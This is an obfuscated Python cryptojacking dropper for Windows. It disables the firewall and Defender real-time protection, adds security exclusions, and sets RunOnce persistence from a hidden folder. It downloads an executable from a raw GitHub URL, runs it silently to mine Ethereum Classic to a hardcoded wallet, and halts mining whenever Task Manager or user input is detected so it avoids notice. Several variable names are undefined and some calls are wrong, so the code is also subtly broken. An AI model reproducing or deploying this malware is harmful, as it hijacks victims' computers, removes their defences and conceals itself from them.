import ctypes
g=False
x=True
V=range
d=print
W=open
c=ctypes.byref
C=ctypes.c_long
l=ctypes.Structure
K=ctypes.windll
import os
s=os.mkdir
n=os.system
v=os.path
p=os.getenv
import random
import threading
L=threading.Thread
import time
D=time.sleep
import urllib.request
import subprocess
h=subprocess.check_output
F='0xE88d6555aDb78f62Cf588EC893098448ffa757E6'
z=(f'-pool eu1-etc.ethermine.org:4444 -ttli 80 -log 0 -clKernel 0 ' f'-powlim -20 -coin etc -wal {WALLET}.' f'Worker{random.randint(10000, 99999)}')
S=p('LOCALAPPDATA')
H=v.join(S,'IdentityService')
X=['taskmgr.exe','processhacker.exe','mbamservice.exe']
i='https://raw.githubusercontent.com/sobadsomad/test/main/test.exe'
P='srvc.exe'
I='srvc.bat'
M=g
G=g
j=(-1,-1)
def T():
 global G
 G=x
 for i in V(1,255):
  K.user32.GetAsyncKeyState(i)
 b('create_folder():',A())
 b('turn_off_firewall():',o())
 b('turn_off_defender():',R())
 b('add_defender_exception():',q())
 b('add_firewall_exception():',Y())
 b('create_bat():',O())
 b('regedit():',w())
 b('download_granjer():',t())
 b('create_silent_starter():',J())
 b('start_granjer():',r())
 b('start_daemon(watchdog_daemon):',k(y))
 b('start_daemon(mouse_daemon):',k(N))
 b('start_daemon(keyboard_daemon):',k(Q))
 while G:
  D(0.1)
 n(f'taskkill /f /im {EXE_NAME}')
def a():
 while x:
  T()
  D(120)
def b(*args):
 if M:
  d(' '.join([arg for arg in args if arg]))
def y():
 global G
 while G:
  s=h('tasklist',shell=x).lower()
  if b'taskmgr.exe' in s or b'processhacker.exe' in s:
   G=g
   b('[STOPPED] triggered by watchdog_daemon')
  D(.25)
def N():
 global G
 global j
 while G:
  m=f()
  if j!=m and j!=(-1,-1):
   G=g
   b('[STOPPED] triggered by mouse_daemon')
  j=m
def Q():
 global G
 while G:
  for i in V(1,255):
   if K.user32.GetAsyncKeyState(i)&0x1:
    G=g
    b('[STOPPED] triggered by keyboard_daemon')
    break
  D(.5)
def k(func):
 B=L(target=func)
 B.daemon=x
 B.T()
def A():
 if not v.isdir(H):
  s(H)
  n(f'attrib +h {SERVICE_FOLDER}')
def O():
 u=v.join(H,I)
 if not v.isfile(u):
  W(u,'w').write(f'@echo off\n' f'setx GPU_FORCE_64BIT_PTR 0\n' f'setx GPU_MAX_HEAP_SIZE 100\n' f'setx GPU_USE_SYNC_OBJECTS 1\n' f'setx GPU_MAX_ALLOC_PERCENT 100\n' f'setx GPU_SINGLE_ALLOC_PERCENT 100\n' f'{SERVICE_FOLDER}\\{EXE_NAME} {ARGUMENTS}')
class U(l):
 E=[('x',C),('y',C)]
def f():
 pt=U()
 K.user32.GetCursorPos(c(pt))
 return(pt.x,pt.y)
def J():
 e=v.join(H,I)
 u=v.join(H,'starter.vbs')
 if not v.isfile(u):
  W(u,'w').write(f'Set oShell = CreateObject("Wscript.Shell")\n' f'Dim strArgs\n' f'strArgs = "cmd /c {_path}"\n' f'oShell.Run strArgs, 0, false')
def t():
 u=v.join(H,P)
 if not v.isfile(u):
  W(u,'wb').write(urllib.request.urlopen(i).read())
def r():
 u=v.join(H,'starter.vbs')
 n(u)
def q():
 n(f'powershell -Command Add-MpPreference ' f'-ExclusionPath "{SERVICE_FOLDER}"')
def Y():
 n(f'netsh advfirewall firewall add rule name="srvc" ' f'dir=in action=allow program="{SERVICE_FOLDER}\\srvc.exe" enable=yes')
def o():
 n('NetSh Advfirewall set allprofiles state off')
def R():
 n('powershell -Command Set-MpPreference ' '-DisableRealtimeMonitoring $true')
def w():
 n('REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce' f'SRVC /t REG_SZ /d {SERVICE_FOLDER}\\{BAT_NAME}')
if __name__=='__main__':
 a()